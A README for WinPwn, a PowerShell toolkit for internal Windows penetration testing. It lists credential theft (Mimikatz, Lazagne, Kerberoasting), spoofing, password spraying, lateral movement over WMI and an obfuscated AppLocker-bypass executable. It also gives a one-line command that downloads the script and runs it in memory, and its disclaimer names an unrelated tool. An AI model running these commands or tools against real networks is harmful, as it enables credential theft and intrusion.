# WinPwn
Still much work to do - Automation for internal Windows Penetrationtest. 

	1) Automatic Proxy Detection
	2) Elevated or unelevated Detection
  	3) Forensic Mode oder Pentest Mode 
		a. Forensik -> Loki + PSRECON + Todo: Threathunting functions
		b. Pentest -> Internal Windows Domain System 
			i. Inveigh NBNS/SMB/HTTPS Spoofing
			ii. Local Reconing -> Hostenum, SessionGopher, FileSearch, PSRecon
			iii. Domain Reconing -> GetExploitableSystems, Powerview functions, ACL-Analysis, ADRecon
				1) Todo: Grouper for Group Policy overview
			iv. Privilege Escalation -> Powersploit (Allchecks), GPP-Passwords,  MS-Exploit Search (Sherlock), WCMDump, JAWS
			v. Lazagne Password recovery
			vi. Exploitation -> Kerberoasting, Mimikittenz, Mimikatz with Admin-rights
			vii. LateralMovement ->  FindLocalAdminAccess 
				1) Invoke-MassMimikatz || Powershell Empire Remote Launcher Execution over WMI
				2) DomainPasswordspray
				
			viii. Share Enumeration
			ix. FindGPOLocation --> Search for user/group rights 
			x. Find-Fruit

Just Import the Modules with "Import-Module .\WinPwn_v0.4.ps1" or with 
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn_v0.4.ps1')

And Start the Script with "WinPwn". The Winpwn function has to be started from the same directory, where the Script was imported.

The "oBEJHzXyARrq.exe"-Executable is an obfuscated Version of jaredhaights PSAttack Tool for Applocker/PS-Restriction Bypass (https://github.com/jaredhaight/PSAttack).

![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/Windows%20PowerShell.png)


## Legal disclaimer:
Usage of BlackEye for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
